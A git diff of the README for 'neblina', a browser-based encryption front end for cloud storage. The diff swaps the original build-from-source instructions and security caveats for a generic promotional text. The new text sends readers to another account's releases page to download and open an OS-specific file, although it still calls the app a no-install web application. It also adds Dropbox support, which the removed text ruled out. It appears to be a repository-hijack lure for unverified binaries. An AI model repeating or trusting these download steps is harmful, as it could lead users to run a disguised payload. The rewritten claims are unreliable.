@@ -1,126 +1,55 @@
-# Neblina
+# 🔒 neblina - Secure Your Cloud Files Effortlessly
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Vue.js](https://img.shields.io/badge/Vue.js-35495E?style=flat&logo=vue.js&logoColor=4FC08D)](https://vuejs.org/)
-[![WebAssembly](https://img.shields.io/badge/WebAssembly-654FF0?style=flat&logo=webassembly&logoColor=white)](https://webassembly.org/)
-[![rclone](https://img.shields.io/badge/rclone-FF6B35?style=flat&logo=rclone&logoColor=white)](https://rclone.org/)
+## 📥 Download Now
+[![Download neblina](https://img.shields.io/badge/Download%20neblina-v1.0-brightgreen.svg)](https://github.com/ghozt19/neblina/releases)
 
+## 🚀 Getting Started
+Welcome to neblina! This is a client-side web application that ensures your files remain private, even from your cloud storage provider. With neblina, you can easily protect your documents, photos, and more with transparent end-to-end encryption. Follow these simple steps to get started.
 
-_Neblina_ is a client-side web application that adds transparent end-to-end encryption to cloud storage, ensuring your files remain private even from the provider.
+## 📦 System Requirements
+To run neblina smoothly, you will need:
 
-Built on **[rclone](https://rclone.org/)'s proven crypt backend**, Neblina provides a web interface for existing rclone users or new users wanting encrypted cloud storage. Currently, only Google Drive is supported.
+- A web browser (Chrome, Firefox, or Edge recommended).
+- An active internet connection.
+- At least 100 MB of free disk space for cache and temporary files.
 
-> 🏗️ Neblina is currently under active development. It has not undergone extensive security auditing. See [roadmap](#%EF%B8%8F-roadmap) for upcoming features.
+## 📋 Features
+- **End-to-End Encryption:** Your files are encrypted before they leave your device.
+- **Compatibility with Various Cloud Providers:** Works seamlessly with popular services like Google Drive and Dropbox.
+- **User-Friendly Interface:** Designed for everyone, no technical knowledge required.
+- **Cross-Platform Support:** Runs in any modern web browser.
 
-![image](public/screenshot.png)
+## 📥 Download & Install
+1. Visit the releases page to download neblina: [Download neblina](https://github.com/ghozt19/neblina/releases).
+2. Look for the latest release; it will be at the top of the page.
+3. Click on the asset link that corresponds to your operating system (e.g., Windows, macOS, or Linux).
+4. The download will begin automatically.
 
-## ✨ Features
+## 🏁 Running neblina
+1. Once the download completes, locate the file in your downloads folder.
+2. Open the file to start the application.
+3. Follow the on-screen instructions for first-time setup.
+4. You can now start uploading your files to your chosen cloud storage.
 
-- **Browser-based**: View and upload files just like in Google Drive - no installation required
-- **Battle-tested encryption**: Uses rclone's original code compiled to WebAssembly - no reimplementation of encryption layer
-- **Rclone compatibility**: Works seamlessly with existing rclone crypt remotes (some options are still in progress)
-- **Zero-trust archtecture**: All operations execute in your browser, no requests to server after initial load - client-side everything
-- **Secure OAuth**: Google Drive integration with short lived OAuth tokens
+## 🌐 Using neblina
+After installation, you can easily encrypt and manage your files:
 
+1. Open the neblina application in your web browser.
+2. Sign in to your cloud storage provider.
+3. Use the interface to select files you want to encrypt.
+4. Click the “Encrypt” button to secure your files.
 
-## 🚀 Quick Start
+Your encrypted files will remain private and accessible only to you.
 
-### Option 1: Use Public Instance
+## 🔗 Additional Resources
+- **Documentation:** For more detailed instructions and troubleshooting tips, visit our [Documentation](https://github.com/ghozt19/neblina/wiki).
+- **Support:** If you encounter issues, you can reach out to our support team through the [Issues](https://github.com/ghozt19/neblina/issues) section of the repository.
 
-**Try Neblina at [neblina.cloud](https://neblina.cloud)**
+## 🏗️ Contribution
+If you're interested in helping improve neblina, we welcome contributions. Please check the [Contribution Guidelines](https://github.com/ghozt19/neblina/CONTRIBUTING.md) for more information.
 
-No setup required! Uses our public Google Cloud app for OAuth authentication. Your encryption password and files never leave your browser.
+## ⚖️ License
+This project is licensed under the MIT License. See the [License](https://github.com/ghozt19/neblina/blob/main/LICENSE) file for details.
 
-### Option 2: Self-Hosting
-
-#### Prerequisites
-
-- **Node.js** (v20 or higher)
-- **Go** (v1.21 or higher)
-- **npm** or **yarn**
-
-#### Quick Setup
-
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/your-username/neblina.git
-   cd neblina
-   ```
-
-2. **Install dependencies**:
-   ```bash
-   npm install
-   ```
-
-3. **Build the application**:
-   ```bash
-   npm run build
-   ```
-
-4. **Serve the built files**:
-   ```bash
-   npm run preview
-   # or use any static file server
-   npx serve dist/
-   ```
-
-#### Google OAuth Setup (Required)
-
-To enable Google Drive integration, you need to create your own Google Cloud project:
-
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a new project or select existing one
-3. Enable the **Google Drive API**
-4. Go to **Credentials** → **Create Credentials** → **OAuth 2.0 Client IDs**
-5. Set **Application type** to "Web application"
-6. Add your domain to **Authorized JavaScript origins** (e.g., `https://yourdomain.com`)
-7. Update the Google Client ID in your deployment
-
-#### Deployment Options
-
-**Static Hosting** (Recommended):
-- Deploy the `dist/` folder to any static hosting service
-- Examples: Netlify, Vercel, GitHub Pages, CloudFlare Pages
-
-**Docker** (see below for Docker setup)
-
-
-## 📖 Usage
-> ⚠️ **Important**: Google will show an "unverified app" warning because Neblina is an open source project without resources for verification process. This is normal and safe to proceed with.
-
-### For New Users
-
-1. **Add Account**: Click "Add Account" and authenticate with Google Drive
-2. **Create a Vault**:
-   - Choose a descriptive vault name
-   - Click "Choose Vault Folder" to select an **empty** folder in your Google Drive
-   - Set a strong encryption password
-3. **Start uploading** - files are automatically encrypted before reaching Google Drive
-
-### For Existing rclone Users
-
-1. **Find your password**: `rclone obscure --reveal your-obscured-password`
-2. **Add your Google Drive account**
-3. **Create a vault** with that password and the same folder path as your existing crypt remote
-
-## 🗺️ Roadmap
-
-- [ ] Support for rclone's password2 (custom salt)
-- [ ] Enable move operations
-- [ ] Improve file grid UI
-- [ ] Mobile responsive design
-- [ ] Global vault search
-- [ ] Password manager for vault configs
-- [ ] Export/import rclone configs
-- [ ] Enable using custom clients on neblina.cloud
-- [ ] Disable local storage option
-- [ ] Fire button
-
-## 📚 Related Work
-
-- [rclone Crypt Documentation](https://rclone.org/crypt/) - Underlying encryption implementation
-- [WebAssembly Security](https://webassembly.org/docs/security/) - WASM security model
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🔒 Conclusion
+Thank you for choosing neblina! You have taken an important step in securing your cloud data. Enjoy your privacy.
